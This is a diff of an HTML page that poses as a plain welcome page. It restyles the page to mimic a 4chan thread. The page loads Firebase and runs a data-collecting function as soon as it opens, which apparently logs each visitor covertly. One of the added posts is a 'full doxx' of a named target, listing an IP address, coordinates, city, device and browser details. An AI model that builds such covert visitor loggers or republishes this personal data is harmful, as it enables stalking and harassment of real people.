@@ -3,7 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>k6tii lore</title>
+    <title>4chan Mimic</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #FEFFED;
+            color: #333;
+        }
+        .post {
+            background-color: #F4E9E1;
+            border: 1px solid #ccc;
+            margin: 20px auto;
+            padding: 15px;
+            max-width: 600px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        .thumbnail {
+            max-width: 150px;
+            height: auto;
+            cursor: pointer;
+            display: block;
+        }
+        .expanded-img {
+            display: none;
+            width: 100%;
+            height: auto;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .post-text {
+            margin: 10px 0;
+        }
+        .post-header {
+            background-color: #EBD5CB;
+            padding: 10px;
+            border-radius: 8px 8px 0 0;
+            font-size: 14px;
+            margin: -15px -15px 10px -15px;
+        }
+        .anonymous {
+            color: #9B849D;
+        }
+        .custom-color {
+            color: inherit; /* Placeholder to be replaced with actual color */
+        }
+    </style>
     <script type="module">
         // Import the functions you need from the SDKs you need
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
@@ -23,7 +70,7 @@
 
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
-        const analytics = getAnalytics(app);
+const analytics = getAnalytics(app);
         const db = getFirestore(app);
 
         console.log("Firebase initialized");
@@ -74,10 +121,75 @@
         }
 
         window.onload = collectAndSendData;
+
+        function toggleImage(img) {
+            const isThumbnail = img.classList.contains('thumbnail');
+            const thumbnailImg = isThumbnail ? img : img.previousElementSibling;
+            const expandedImg = isThumbnail ? img.nextElementSibling : img;
+
+            if (isThumbnail) {
+                thumbnailImg.style.display = 'none';
+                expandedImg.style.display = 'block';
+            } else {
+                expandedImg.style.display = 'none';
+                thumbnailImg.style.display = 'block';
+            }
+        }
+
+        // Function to set custom text colors
+        function setCustomTextColor(color) {
+            const elements = document.querySelectorAll('.custom-color');
+            elements.forEach(element => {
+                element.style.color = color;
+            });
+        }
+
+        // Example: Set custom text color to blue
+        setCustomTextColor('#800001');
     </script>
 </head>
 <body>
     <h1>Welcome to our Website!</h1>
     <p>Thank you for visiting.</p>
+
+    <div class="post">
+        <div class="post-header"><span class="anonymous">Anonymous</span> ## Mod 09/02/13(Mon)17:58:33 No.17318579</div>
+        <img src="https://media.discordapp.net/attachments/1214301893153521818/1253909678816235591/IMG_9668.jpg?ex=667791e3&is=66764063&hm=43d884d58a0e3e97821168e26af55a0dc64a522549aa6416093c22ce1e260f6c&" alt="Image 1 Thumbnail" class="thumbnail" onclick="toggleImage(this)">
+        <img src="https://media.discordapp.net/attachments/1214301893153521818/1253909678816235591/IMG_9668.jpg?ex=667791e3&is=66764063&hm=43d884d58a0e3e97821168e26af55a0dc64a522549aa6416093c22ce1e260f6c&" alt="Image 1 Expanded" class="expanded-img" onclick="toggleImage(this)">
+        <p class="post-text custom-color">hello thank for watching hello thank you for watching hello thank you for watching:33</p>
+    </div>
+
+    <div class="post">
+        <div class="post-header"><span class="anonymous">Anonymous</span> ## Mod 09/02/13(Mon)18:00:00 No.17318580</div>
+        <img src="https://i.imgur.com/EHKQJOA.jpg" alt="Image 2 Thumbnail" class="thumbnail" onclick="toggleImage(this)">
+        <img src="https://i.imgur.com/EHKQJOA.jpg" alt="Image 2 Expanded" class="expanded-img" onclick="toggleImage(this)">
+        <p class="post-text custom-color">snails full doxx: city
+"SC#o Paulo"
+(string)
+date
+"2024-06-22"
+(string)
+device
+"iPhone"
+(string)
+geolocation
+"SC#o Paulo, Brazil"
+(string)
+ip
+"177.46.111.225"
+(string)
+latitude
+-1.179
+(number)
+longitude
+-48.1934
+(number)
+time
+"03:05:38"
+(string)
+userAgent
+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/13E148 Safari/604.2"
+(string)</p>
+    </div>
 </body>
 </html>
